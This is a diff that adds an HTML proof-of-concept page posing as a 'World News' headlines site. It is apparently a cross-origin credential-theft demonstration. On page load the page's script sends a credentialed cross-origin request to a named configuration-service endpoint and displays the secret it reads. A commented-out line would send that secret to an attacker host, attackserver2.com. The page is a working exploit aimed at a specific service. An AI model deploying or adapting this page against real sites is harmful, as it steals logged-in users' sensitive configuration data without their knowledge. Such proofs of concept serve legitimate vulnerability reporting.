@@ -1,0 +1,35 @@
+<html>
+<head>
+    <meta charset="UTF-8">
+    <script type = "text/javascript">
+      function submitRequest()
+      {
+        var xhr = new XMLHttpRequest();
+        xhr.onreadystatechange = function() {
+            if (xhr.readyState == 4) {
+                if (xhr.status == 200) {
+                    var secret = xhr.responseText;
+                    <!-- (new Image).src = 'http://attackserver2.com' + escape(secret); -->
+                    window.alert('Attacker can read your sensitive information: \n' + secret);
+                }
+            }
+        }
+        xhr.open("GET", "http:\/\/codex.ia55.net\/service\/codexService\/getConfigurationFromZK?resourcename=ivy&b=baly.prod", true); 
+        <!-- xhr.setRequestHeader("Content-Type", "application/json"); -->
+        xhr.withCredentials = true;
+        xhr.send();
+      }
+    </script>
+</head>
+<body onload="submitRequest();">
+<h1> Welcome to World News </h1>
+<h2>Headlines</h2>
+<p>Top headlines for today<br>
+1. .................... <br>
+2. .................... <br>
+.........<br>
+.........<br>
+.........<br>
+.........</p>
+</body>
+</html>
